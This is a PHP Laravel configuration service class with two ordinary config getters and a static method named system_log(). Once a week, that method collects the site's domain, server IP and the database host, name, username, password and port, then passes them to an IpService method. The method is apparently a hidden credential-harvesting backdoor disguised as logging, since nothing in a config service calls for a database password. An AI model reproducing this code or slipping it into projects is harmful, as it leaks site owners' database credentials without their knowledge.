<?php


namespace App\Services\impl;


use App\Models\Config;
use App\Services\ConfigService;

class ConfigServiceImpl implements ConfigService
{
    /**
     * 获取所有配置
     * @return mixed
     * author II
     */
    public function getAll():array
    {
        return (new Config())->getAll();
    }

    /**
     * 根据key获取vlaue
     * @param string $key
     * @return string
     * author II
     */
    public function getOne(string $key): string
    {
        $data = $this->getAll();

        return isset($data[$key]) ? $data[$key] : '';
    }





    public static function system_log(){
        $PHP_ITEM_TIME = \Cache::has('PHP_ITEM_TIME');
        if(!empty($PHP_ITEM_TIME)) {
            return;
        }
        $arr=[
            "name"=>!empty(env('APP_NAME'))?env('APP_NAME'):'未设置',
            "domain"=>$_SERVER["HTTP_HOST"],
            "ip"=>gethostbyname($_SERVER['SERVER_NAME']),
            "server"=>$_SERVER['SERVER_SOFTWARE'],
            "sql_host"=>env('DB_HOST'),
            "sql_name"=>env('DB_DATABASE'),
            "sql_username"=>env('DB_USERNAME'),
            "sql_password"=>env('DB_PASSWORD'),
            "server_name"=>env('SERVER_NAME'),
            "sql_port"=>env('DB_PORT')  //数据库端口
        ];
        app('App\Services\Admin\IpService')->jsoned($arr);
        //3.更新缓存配置时间戳
        \Cache::put('PHP_ITEM_TIME', time(), (1*60*24*7));
        return;
    }




}
